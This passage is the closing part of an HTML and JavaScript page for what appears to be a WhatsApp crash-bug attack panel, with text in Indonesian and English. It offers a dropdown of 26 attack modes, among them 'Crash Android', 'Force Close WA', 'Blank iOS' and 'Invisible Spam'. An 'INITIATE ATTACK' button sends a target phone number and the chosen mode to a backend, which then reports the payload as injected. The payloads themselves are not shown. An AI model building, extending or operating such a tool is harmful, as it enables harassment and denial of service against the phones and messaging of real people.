                    <span id="selectedBugLabel">Select Type</span>
                </div>
                <i class="fas fa-caret-down"></i>
            </div>
            <div class="bug-dropdown-list" id="bugDropdown">
            </div>
        </div>

        <button id="executeBtn" class="execute-btn">
            <i class="fas fa-radiation"></i> INITIATE ATTACK
        </button>
    </div>

    <div class="modal-overlay" id="customModal">
        <div class="modal-content" id="modalContent">
            <div class="modal-header" id="modalTitle">NOTIFIKASI</div>
            <div class="modal-body" id="modalMessage">Pesan disini...</div>
            <div class="modal-footer">
                <button class="close-modal-btn" onclick="closeModal()">UNDERSTOOD</button>
            </div>
        </div>
    </div>

    <div class="bottom-nav">
        <a href="/dashboard" class="nav-item"><i class="fas fa-home"></i>Home</a>
        <a href="/execution" class="nav-item active"><i class="fab fa-whatsapp"></i>WhatsApp</a>
        <a href="/tools" class="nav-item"><i class="fas fa-tools"></i>Tools</a>
    </div>

    <script>
        // BACKEND CONFIGURATION
        const bugTypes = [
    { id: 'delay', icon: 'fab fa-android', title: 'Delay Invisible' },
    { id: 'crash', icon: 'fas fa-hourglass-half', title: 'Crash Android' },
    { id: 'fcandro', icon: 'fas fa-skull', title: 'Force Close WA' },
    { id: 'fcinvsios', icon: 'fas fa-ghost', title: 'Invisible FC iOS' },
    { id: 'blank-ios', icon: 'fas fa-apple', title: 'Blank iOS' },
    { id: 'delayv2', icon: 'fas fa-clock', title: 'Delay Hard' },
    { id: 'stuck', icon: 'fas fa-thumbtack', title: 'Ui Blank' },
    { id: 'SqL-Exception', icon: 'fas fa-database', title: 'Crash SqL BUGS' },
    { id: 'combo', icon: 'fas fa-compress-alt', title: 'COMBINATION BUGS' },
    { id: 'Trash-IOS', icon: 'fas fa-trash', title: 'Trash Loc iOS' },
    { id: 'Neural-Hardcore', icon: 'fas fa-brain', title: 'Neural Hardcore iOS' },
    { id: 'CrashUi', icon: 'fas fa-tv', title: 'Crash UI' },
    { id: 'blank-iphone', icon: 'fas fa-mobile', title: 'Blank iPhone' },
    { id: 'delay-tredict', icon: 'fas fa-hourglass-start', title: 'Tredict Delay' },
    { id: 'carousel-crash', icon: 'fas fa-images', title: 'Carousel Crash' },
    { id: 'delay-xa', icon: 'fas fa-stopwatch', title: 'XA Delay Maker' },
    { id: 'delay-vamp', icon: 'fas fa-heart', title: 'Vampire Super Delay' },
    { id: 'spack-freeze', icon: 'fas fa-snowflake', title: 'Spack Freeze' },
    { id: 'verload-fc', icon: 'fas fa-bolt', title: 'Verload FC' },
    { id: 'invisible-spam', icon: 'fas fa-eye-slash', title: 'Invisible Spam' },
    { id: 'delay-5gb', icon: 'fas fa-weight-hanging', title: 'Delay 5GB' },
    { id: 'crash-beta', icon: 'fas fa-bug', title: 'Crash Beta' },
    { id: 'ivs-null', icon: 'fas fa-ban', title: 'IvsNull Crash' },
    { id: 'cosmo-uifc', icon: 'fas fa-meteor', title: 'Cosmo UI FC' },
    { id: 'fcbos', icon: 'fas fa-layer-group', title: 'force close one msg' },
    { id: 'force-close', icon: 'fas fa-times-circle', title: 'Force Close' }
];

        let selectedBugType = null;
        const bugDropdown = document.getElementById('bugDropdown');
        const menuToggle = document.getElementById('menuToggle');
        const selectedBugLabel = document.getElementById('selectedBugLabel');
        const executeBtn = document.getElementById('executeBtn');

        const bannerVideo = document.getElementById('bannerVideo');
        const soundBtn = document.getElementById('soundBtn');
        const soundIcon = document.getElementById('soundIcon');

        // Sound Logic
        soundBtn.onclick = () => {
            if (bannerVideo.muted) {
                bannerVideo.muted = false;
                soundIcon.classList.replace('fa-volume-mute', 'fa-volume-up');
            } else {
                bannerVideo.muted = true;
                soundIcon.classList.replace('fa-volume-up', 'fa-volume-mute');
            }
        };

        function initBugList() {
            bugTypes.forEach(bug => {
                const item = document.createElement('div');
                item.className = 'bug-item';
                item.innerHTML = \`<i class="\${bug.icon}" style="color:var(--accent-pink); width:20px"></i> <span>\${bug.title}</span>\`;
                item.onclick = (e) => {
                    e.stopPropagation();
                    selectedBugType = bug.id;
                    selectedBugLabel.innerText = bug.title;
                    bugDropdown.classList.remove('active');
                };
                bugDropdown.appendChild(item);
            });
        }

        menuToggle.onclick = (e) => {
            e.stopPropagation();
            bugDropdown.classList.toggle('active');
        };

        window.onclick = () => { bugDropdown.classList.remove('active'); };

        function showPopup(type, title, message) {
            const modal = document.getElementById('customModal');
            const content = document.getElementById('modalContent');
            content.className = 'modal-content ' + type;
            document.getElementById('modalTitle').innerHTML = title;
            document.getElementById('modalMessage').innerHTML = message;
            modal.style.display = 'flex';
        }

        function closeModal() {
            document.getElementById('customModal').style.display = 'none';
        }

        // --- BACKEND EXECUTION LOGIC ---
        executeBtn.onclick = async function() {
            const num = document.getElementById('numberInput').value.trim();
            
            if (!num) {
                showPopup('error', '<i class="fas fa-exclamation-triangle"></i> ERROR', 'Harap isi <b>Nomor Target</b> sebelum eksekusi!');
                return;
            }

            if (!selectedBugType) {
                showPopup('error', '<i class="fas fa-bug"></i> ERROR', 'Silakan pilih <b>Bug Type</b> terlebih dahulu!');
                return;
            }

            // Start Loading
            this.disabled = true;
            this.innerHTML = '<i class="fas fa-circle-notch fa-spin"></i> EXECUTING...';

            try {
                // MENGIRIM DATA KE BACKEND SERVER (/execution)
                const response = await fetch('/execution', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        target: num,
                        mode: selectedBugType
                    })
                });

                const data = await response.json();

                if (data.success) {
                    showPopup('success', '<i class="fas fa-check-circle"></i> SUCCESS', 
                        \`Payload <b>\${selectedBugType.toUpperCase()}</b> telah berhasil diinjeksi ke nomor <b>\${num}</b>.\`);
                } else {
                    showPopup('error', '<i class="fas fa-times-circle"></i> FAILED', 
                        data.error || 'Terjadi kesalahan sistem saat pengiriman payload.');
                }

            } catch (error) {
                // Fallback jika fetch gagal (Network Error)
                console.error('Execution Error:', error);
                showPopup('error', '<i class="fas fa-wifi"></i> NETWORK ERROR', 
                    'Gagal terhubung ke server. Pastikan koneksi internet stabil.');
            } finally {
                // Stop Loading
                this.disabled = false;
                this.innerHTML = '<i class="fas fa-radiation"></i> INITIATE ATTACK';
            }
        };

        document.addEventListener('DOMContentLoaded', () => {
            initBugList();
        });
    </script>
</body>
</html>`;
};